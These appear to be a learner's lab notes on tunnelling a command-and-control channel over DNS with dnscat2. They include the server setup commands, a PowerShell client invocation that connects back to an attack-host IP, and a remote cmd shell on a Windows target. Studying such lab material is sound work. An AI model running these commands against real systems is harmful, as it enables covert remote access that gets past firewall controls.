DNS used to send data between 2 hosts
- Eg. Ubuntu machine = DNS client, attack host = DNS server
	- dnscat2 client continually runs a polling loop, continually asking "do you have anything for me?" ie. **DNS Query**
	- When we run a command on our attack host, eg. "whoami", it is sent tp tje server embedded in a **DNS Response** (after the client sends a query)
	- This bypasses firewalls, since internal hosts are allowed to send DNS queries outwards but are not allowed to accept inbound connections (except DNS responses)

On local attack host
1. Clone dnscat2 and setup server
	- `git clone https://github.com/iagox86/dnscat2.git
	- `cd dnscat2/server
	- `sudo gem install bundler
	- `sudo bundle install
2. Start the dns server
	- `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
		- host = our own ip
		- domain doesn't matter, since it's not real resolution anyway, but must match what we put for the client
	- Will then get secret key which we need to provide to dnscat2 client on the Windows host

On target machine (Windows)
1. Clone dnscat2-powershell
	- `git clone https://github.com/lukebaggett/dnscat2-powershell.git`
	- Or just clone on attack host, then transfer the dnscat2.ps1 file over to Windows with Invoke Web-Request
2. Import the module
	- `Import-Module .\dnscat2.ps1`
3. Establish tunnel back to the server running the attack host
	- `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`
	- 10.10.14.18 is our attack hos IP
	- PreSharedSecret is the secret key from above

On attack host
- Should see that tunnel is establised
- `windows -i 1
	- This puts me into a cmd.exe running on the Windows machine.
